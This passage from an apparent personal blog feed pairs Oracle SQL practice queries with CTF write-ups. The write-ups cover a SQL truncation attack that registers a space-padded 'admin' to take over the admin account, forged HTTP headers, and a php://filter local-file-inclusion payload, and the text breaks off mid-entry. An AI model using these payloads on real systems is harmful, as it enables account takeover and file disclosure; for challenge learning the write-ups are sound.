多的所有员工的编号、姓名、部门名称、领导姓名、部门人数、平均工资、最高和最低工资</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.empno,e.ename,d.dname,m.ename,temp.count,temp.avg,temp.max,temp.min<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count,<span class="hljs-built_in">AVG</span>(sal) avg,<span class="hljs-built_in">MAX</span>(sal) max,<span class="hljs-built_in">MIN</span>(sal) min<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp,emp m<br><span class="hljs-keyword">WHERE</span> e.sal <span class="hljs-operator">&gt;</span><span class="hljs-keyword">ANY</span> (<span class="hljs-keyword">SELECT</span> sal <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> ename <span class="hljs-keyword">IN</span> (<span class="hljs-string">&#x27;SMITH&#x27;</span>,<span class="hljs-string">&#x27;ALLEN&#x27;</span>))<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.mgr(<span class="hljs-operator">+</span>) <span class="hljs-operator">=</span> m.empno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/71f438855c4248ee9a4ae12d98d83664.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="3"><br><br /></p><p><strong>4. 查询雇佣日期早于其直接上级的所有员工的编号、姓名、部门名称、部门位置、部门人数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.empno,e.ename,d.dname,d.loc,temp.count<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp,emp m<br><span class="hljs-keyword">WHERE</span> (e.mgr <span class="hljs-operator">=</span> m.empno)<br><span class="hljs-keyword">AND</span> (e.hiredate <span class="hljs-operator">&lt;</span> m.hiredate)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno);<br></code></pre></td></tr></table></figure><br /><p><strong>5. 查询所有办事员的姓名及其部门名称、部门的人数，工资等级</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,d.dname,temp.count,s.grade<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp,salgrade s<br><span class="hljs-keyword">WHERE</span> (e.job <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;CLERK&#x27;</span>)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.sal <span class="hljs-keyword">BETWEEN</span> s.losal <span class="hljs-keyword">AND</span> s.hisal);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2c5c9ee8865c4497869e26d90b7c5904.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="5"><br><br /></p><p><strong>6. 查询所有部门的部门名称，部门位置和部门人数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> d.dname,d.loc,temp.count<br><span class="hljs-keyword">FROM</span> dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp<br><span class="hljs-keyword">WHERE</span> (d.deptno <span class="hljs-operator">=</span> temp.dno(<span class="hljs-operator">+</span>));<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/df21c2291c064286952cbdf3f83ca9e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="6"></p><br /><p><strong>7. 查询雇员姓名中带 ‘K’ 字符的雇员姓名及其所在部门的人数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,temp.count<br><span class="hljs-keyword">FROM</span> emp e,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp<br><span class="hljs-keyword">WHERE</span> (e.ename <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%K%&#x27;</span>)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/6ed2f72dad7b4e8596d727c30e69709a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="7"><br><strong>8. 查询每个工资等级雇员的人数、最高工资，最低工资，平均工资</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> s.grade,<span class="hljs-built_in">COUNT</span>(e.empno) count,<span class="hljs-built_in">MAX</span>(e.sal) max,<span class="hljs-built_in">MIN</span>(e.sal) min,TRUNC(<span class="hljs-built_in">AVG</span>(e.sal)) avg<br><span class="hljs-keyword">FROM</span> emp e,salgrade s<br><span class="hljs-keyword">WHERE</span> e.sal <span class="hljs-keyword">BETWEEN</span> s.losal <span class="hljs-keyword">AND</span> s.hisal<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> s.grade<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> grade;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9bf836c0e3fa4888a49280f3ccc37d6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="8"><br><br /></p><p><strong>9. 查询会计部的所有雇员姓名、基本工资、雇佣日期、部门位置，工资等级，部门人数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.sal,e.hiredate,d.loc,s.grade,temp.count<br><span class="hljs-keyword">FROM</span> emp e,dept d,salgrade s,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp<br><span class="hljs-keyword">WHERE</span> (e.deptno <span class="hljs-operator">=</span> (<span class="hljs-keyword">SELECT</span> deptno <span class="hljs-keyword">FROM</span> dept <span class="hljs-keyword">WHERE</span> dname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;ACCOUNTING&#x27;</span>))<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.sal <span class="hljs-keyword">BETWEEN</span> s.losal <span class="hljs-keyword">AND</span> s.hisal)<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> s.grade;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa8ea587a63544a599e313da8bd1c60a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="9"></p><p><strong>10. 在 Oracle数据库 中有表 ‘ test ‘，它包含属性 “ test_code”，” test_category ” 和 ” test_name”查询 test_category 取值为 ” MySQL ” 或 ” SQLServer ” 的行</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> test<br><span class="hljs-keyword">WHERE</span> (test_category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;MySQL&#x27;</span>) <span class="hljs-keyword">OR</span> (test_category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SQLServer&#x27;</span>);<br></code></pre></td></tr></table></figure><p>鉴于自己没这张表，所以没图，但是要会敲</p><br /><p><strong>11. 查询雇佣日期早于领导的员工的姓名、部门名称、部门人数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,d.dname,temp.count<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp,emp m<br><span class="hljs-keyword">WHERE</span> (e.mgr <span class="hljs-operator">=</span> m.empno)<br><span class="hljs-keyword">AND</span> (e.hiredate <span class="hljs-operator">&lt;</span> m.hiredate)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/27bb7fb7af624043b068ab6a63131e09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="11"><br><br /></p><p><strong>12. 统计有领导和没有领导的员工的人数和平均工资</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(empno),TRUNC(<span class="hljs-built_in">AVG</span>(sal)) <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> (mgr <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>)<br><span class="hljs-keyword">union</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(empno),TRUNC(<span class="hljs-built_in">AVG</span>(sal)) <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> (mgr <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c02002c22b304c38a3ed78888e4f2cab.png#pic_center" alt="12"></p><br /><p><strong>13. 列出薪金比部门30都多的所有员工的姓名、基本工资、部门位置、领导姓名、所在部门的人数及最高工资</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.sal,d.loc,m.ename,temp.count,temp.max<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count,<span class="hljs-built_in">MAX</span>(sal) max<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>) temp,emp m<br><span class="hljs-keyword">WHERE</span> (e.sal <span class="hljs-operator">&gt;</span><span class="hljs-keyword">ALL</span> (<span class="hljs-keyword">SELECT</span> sal <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> deptno <span class="hljs-operator">=</span> <span class="hljs-number">30</span>))<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno)<br><span class="hljs-keyword">AND</span> (e.mgr <span class="hljs-operator">=</span> m.empno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/fb9c6d9ed956489cb88d1a8fb6500f50.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="13"></p><p><strong>14. 查询部门20中，雇佣年限超过37年而工资在2000以下的雇员信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> (deptno <span class="hljs-operator">=</span> <span class="hljs-number">20</span>)<br><span class="hljs-keyword">AND</span> (TRUNC(MONTHS_BETWEEN(SYSDATE,hiredate)<span class="hljs-operator">/</span><span class="hljs-number">12</span>) <span class="hljs-operator">&gt;</span> <span class="hljs-number">37</span>)<br><span class="hljs-keyword">AND</span> (sal <span class="hljs-operator">&lt;</span> <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/11e3435c913a49558c7b9592811f0c11.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="14"><br><br /></p><p><strong>15. 查询至少有一个员工的所有部门</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> deptno,<span class="hljs-built_in">COUNT</span>(empno)<br><span class="hljs-keyword">FROM</span> emp e<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(empno) <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/42b0ba14044b44b1946cec989e5cbf7c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="15"><br><br /></p><p><strong>16. 查询基本工资比 “ Smith ” 多的所有员工信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> sal <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">SELECT</span> sal <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">WHERE</span> ename <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SMITH&#x27;</span>)<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sal,deptno;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0ae83f19cd3c478ca1d4f7752353c0b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="16"><br><br /></p><p><strong>17. 查询所有员工的姓名及其领导的姓名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,m.ename lead<br><span class="hljs-keyword">FROM</span> emp e,emp m<br><span class="hljs-keyword">WHERE</span> e.mgr <span class="hljs-operator">=</span> m.empno(<span class="hljs-operator">+</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/df68b89e53744ee1a48ed8f1b49a7ffc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="17"><br><br /></p><p><strong>18. 查询雇佣日期早于其领导的所有员工信息</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> emp e,emp m<br><span class="hljs-keyword">WHERE</span> (e.mgr <span class="hljs-operator">=</span> m.empno)<br><span class="hljs-keyword">AND</span> (e.hiredate <span class="hljs-operator">&lt;</span> m.hiredate);<br></code></pre></td></tr></table></figure><br /><p><strong>19.查询最高基本工资低于5000的所有岗位名称及从事此工作的雇员姓名，其所在的部门名称、部门人数、部门平均工资</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,d.dname,temp.count,temp.avg<br><span class="hljs-keyword">FROM</span> emp e,dept d,(<br>    <span class="hljs-keyword">SELECT</span> deptno dno,<span class="hljs-built_in">COUNT</span>(empno) count,TRUNC(<span class="hljs-built_in">AVG</span>(sal)) avg<br>    <span class="hljs-keyword">FROM</span> emp<br>    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> deptno<br>)temp<br><span class="hljs-keyword">WHERE</span> (e.job <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> job <span class="hljs-keyword">FROM</span> emp <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> job <span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(empno) <span class="hljs-operator">&lt;</span> <span class="hljs-number">5000</span> ))<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> temp.dno);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a8623f4842994ba2a6f693b9bc5652cf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="19"></p><hr /><p>oracle数据库告一段落</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Oracle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku_login 1</title>
    <link href="/2021/10/08/Bugku_login%201/"/>
    <url>/2021/10/08/Bugku_login%201/</url>
    
    <content type="html"><![CDATA[<p>﻿<h1>Bugku_login 1</h1></p><hr /><p><strong>解题点：</strong></p><p>SQL约束攻击</p><hr /><p><strong>SQL约束攻击：</strong><br>举个栗子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(username, password) <span class="hljs-keyword">values</span>(&quot;admin               x&quot;, &quot;qiye&quot;);<br></code></pre></td></tr></table></figure><p>前提，MySQL的sql_mode设置为default</p><p>我注册一个上述那样admin的值<br>首先，在php里会判定和admin不是同个用户，是新注册的用户<br>然后到了数据库，由于超过字段限制的最大长度，<strong>会发生截断</strong>，这个值多余部分会被截断，而多余的空格会被删除，此时，数据库听php写入这条信息，你就可以用自己注册时用的密码直接登录admin，而系统会认为你是admin管理员，达到越权行为。</p><hr /><p><strong>解题：</strong><br>知道原理后，这题其实很简单，直接注册一个超过字段长度的admin用户<br><img src="https://img-blog.csdnimg.cn/99f50430932744eda133737dad999fb7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="注册"><br>注册成功就行<br>然后登录admin用户，用的密码是自己注册时用的密码<br><img src="https://img-blog.csdnimg.cn/d0033450e34b40279bddc5c7918fc2bc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="登录admin"><br>拿到flag<br><img src="https://img-blog.csdnimg.cn/33fd86febe21436985755d99a9fd9100.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="flag"><br>参考文章：<br><a href="https://blog.csdn.net/m0_37444209/article/details/92229495">sql约束攻击</a><br><a href="https://www.cnblogs.com/vincy99/p/9642941.html">sql语句截断</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-[极客大挑战 2019]Http 1</title>
    <link href="/2021/10/02/buuctf-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp%201/"/>
    <url>/2021/10/02/buuctf-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp%201/</url>
    
    <content type="html"><![CDATA[<p>﻿<strong>buuctf-[极客大挑战 2019]Http 1</strong></p><hr/>解题点：<br /> X-Forwarded-For、Referer、User-Agent <br /> <br /> <div><li>X-Forwarded-For：通过http代理或负载均衡连接web服务器的原始ip地址</li><li>Referer：页面请求来源地址</li><li>User-Agent：用户代理，一般用来区分不同的浏览器</li></div><hr /><p>一开始，打开bp抓包，看网页源代码时会发现一个前往<strong>Secret.php</strong>的a链接，那么请求这个php页面，之后他会给你提示，让你去伪造X-Forwarded-For、Referer、User-Agent，跟着他的要求就行，挺简单的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agent：把你所使用的浏览器名改成Syclover<br>Referer: https://www.Sycsecret.com<br>X-Forwarded-For: 127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9a0be1fe1859457ca20ef9a6ee57d262.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="伪造"></p><p>丢进bp的Repeater里Send一下就行</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuctf-[极客大挑战 2019]Secret File1</title>
    <link href="/2021/10/01/buuctf-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File1/"/>
    <url>/2021/10/01/buuctf-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File1/</url>
    
    <content type="html"><![CDATA[<p>﻿<strong>buuctf-[极客大挑战 2019]Secret File1</strong></p><hr /><p>题目地址：<br><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><hr />题目上手，先确认网页源代码<p><img src="https://img-blog.csdnimg.cn/5563d7231b24490ebf65e1f83b0b6fa5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="访问Archive_room.php"><br>没事，跟着他走，直接访问<strong>Archive_room.php</strong><br>第二个页面是个点击框，这里bp抓包确认；若是直接访问，会跳到<strong>end.php</strong><br><img src="https://img-blog.csdnimg.cn/910ed8389bf24f68b37911fd2960c80a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="action.php抓包"><br>可以发现<strong>secr3t.php</strong>才是我们应该访问的，那么我们直接访问<strong>secr3t.php</strong><br><img src="https://img-blog.csdnimg.cn/af325d3a5e2a443395b206d1c14191fc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="secr3t.php源代码"><br>很简单的代码审计,别下上面那些字符就行，<strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">secr3t.php?file=flag.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5196cbe2f8da408faf54ccfaacf2b1b5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="直接请求flag.php"><br>老套娃了，但是没有关系，改用php协议读文件就ok了<br><strong>payload:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">secr3t.php?file=php://filter/<span class="hljs-built_in">read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img 